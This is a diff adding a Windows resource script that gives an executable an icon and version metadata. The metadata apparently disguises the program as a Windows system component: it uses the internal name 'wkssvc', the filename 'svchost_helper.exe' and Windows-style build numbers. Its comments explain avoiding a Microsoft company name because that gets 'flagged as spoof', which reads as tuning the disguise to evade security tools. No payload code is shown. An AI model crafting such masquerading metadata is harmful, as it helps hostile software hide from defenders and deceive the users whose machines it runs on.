@@ -1,0 +1,36 @@
+#include <windows.h>
+
+// App icon
+IDI_ICON1 ICON "app_icon.ico"
+
+// Version info — neutral metadata, no Microsoft spoofing
+// CompanyName should NOT be "Microsoft Corporation" (flagged as spoof)
+// Instead use a plausible neutral company name
+1 VERSIONINFO
+FILEVERSION     14,2,9200,16384
+PRODUCTVERSION  14,2,9200,16384
+FILEFLAGSMASK   0x3fL
+FILEFLAGS       0x0L
+FILEOS          VOS_NT_WINDOWS32
+FILETYPE        VFT_APP
+FILESUBTYPE     0x0L
+BEGIN
+    BLOCK "StringFileInfo"
+    BEGIN
+        BLOCK "040904b0"
+        BEGIN
+            VALUE "CompanyName",      "Workstation Suite"
+            VALUE "FileDescription",  "Workstation Helper Service"
+            VALUE "FileVersion",      "14.2.9200.16384"
+            VALUE "InternalName",     "wkssvc"
+            VALUE "LegalCopyright",   "(c) Workstation Suite. All rights reserved."
+            VALUE "OriginalFilename", "svchost_helper.exe"
+            VALUE "ProductName",      "Workstation Suite 2024"
+            VALUE "ProductVersion",   "14.2.9200.16384"
+        END
+    END
+    BLOCK "VarFileInfo"
+    BEGIN
+        VALUE "Translation", 0x409, 0x04b0
+    END
+END
